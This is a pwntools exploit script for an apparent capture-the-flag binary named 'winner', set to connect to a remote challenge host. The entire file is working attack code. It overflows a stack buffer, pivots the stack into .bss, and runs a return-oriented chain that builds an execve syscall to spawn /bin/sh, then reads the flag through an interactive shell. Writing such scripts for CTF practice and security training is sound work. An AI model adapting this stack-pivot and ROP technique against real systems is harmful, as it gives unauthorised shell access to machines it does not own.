#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './winner'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '35.222.73.197', 42048

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# break *0x4012b7
# break *0x4012cd
break *0x401223
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec winner
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

def exploit():
    global io
    io = initialize()

    io.recvuntil(b'3. 0x')
    stack = int(io.recvline().strip(), 16)
    # rbp = stack + 0x110 + 0x100

    payload = b'/bin/sh\x00'
    payload += b'\x00' * (256-len(payload))
    payload += p64(elf.bss() + 0x200) # pivot
    payload += p64(0x4012a1) # fgets again
    payload += p64(0x4012cc) # leave; ret

    log.info('payload len: %d', len(payload))
    assert(len(payload) <= 288)
    io.sendline(payload)

    payload = b'/bin/sh\x00'
    payload += p64(0x0) * 2
    payload += p64(0x4011d1) # pop rdi
    payload += p64(elf.bss() + 0x100)
    payload += p64(0x401211) # pop rsi
    payload += p64(0x0)
    payload += p64(0x40121a) # pop rdx
    payload += p64(0x0)
    payload += p64(0x4011da) # mov rax, 0x40; pop rbp; ret
    payload += p64(0x0)
    payload += p64(0x4011e8) # add rax, 0x1  pop rbp ; ret
    payload += p64(0x0)
    payload += p64(0x4011fd) # sub rax, 0x6; pop rbp; ret
    payload += p64(0x0)
    payload += p64(0x401223) # syscall
    payload += b'\x00' * (264-len(payload))
    payload += p64(0x4011cb) # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    payload += p64(elf.bss() + 0x100)

    sleep(1)
    io.sendline(payload)

    sleep(1)
    io.sendline(b'cat flag*')

    log.success('stack: %#x', stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()